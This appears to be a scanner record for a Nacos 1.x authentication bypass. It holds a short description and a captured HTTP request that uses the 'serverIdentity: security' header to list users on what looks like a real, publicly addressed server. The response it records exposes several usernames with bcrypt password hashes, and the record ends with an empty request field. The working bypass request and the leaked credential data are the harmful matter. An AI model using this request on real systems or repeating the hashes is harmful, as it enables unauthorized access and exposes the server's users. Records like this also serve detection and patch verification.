info.name: Nacos 1.x - Authentication Bypass
info.author: taielab,pikpikcu,SleepingBag945
info.description: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.

req_resp.req:
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
HOST: 47.94.1.169
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
serverIdentity: security
req_resp.resp:
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 21 Mar 2025 14:30:01 GMT
Keep-Alive: timeout=60
Connection: keep-alive

{"totalCount":21,"pageNumber":1,"pagesAvailable":3,"pageItems":[{"username":"2oRH5Zu5Re58fqwHUpzx5OlxPxA","password":"$2a$10$WNZK2yArnvCGTuT9JRjIieimj.5e6cDKRBGQYrOxdbxx/OOKCDpSC"},{"username":"2r6BdHQXAemyp7OorVzGNzXrqje","password":"$2a$10$l5jdeOsEzFnqSCJN57yvA.UHIDKAwjipfY3u/23cenq8CsA4Ig2nG"},{"username":"2rNmgPpzjLuxFfr4tqwZstVP6Od","password":"$2a$10$DettbQ72z3wqATWIQlB2mez97wsQglFXWRIcvDFbIwB9HbikpjAui"},{"username":"abc123","password":"$2a$10$mcwUNSrf.aYQhdGF3x5kneSupb7u3wz4avhUuqucSiNHOgq0U3FYq"},{"username":"haidan","password":"$2a$10$KNSM2/D6qxSYN8pE1DJpOuFsXk9G9cSXLgNctnTvPqSvUdtj.QyqW"},{"username":"myworld5483","password":"$2a$10$Nu4mym0swnWZAOr1BPYIn.0Bir38nBSJUBcRPfg0Ge9waSswPSS/S"},{"username":"myworld7990","password":"$2a$10$gMAzRBexMSzXI5GlN0JzM.ceHIhTfTb98q3WDL07wRCFNmGxSnY5y"},{"username":"na","password":"$2a$10$dIRfMs8h3dUidnnI47vnuO6xN6smlSM3yeAT1b3pMCvkzJPN7D0OW"},{"username":"nacos","password":"$2a$10$MZw1YgUaj7G5AOOGxbYjjuOQbRBPWhqmi1UGRqEJj3pzipxuz9YlO"}]}

req_resp.req:
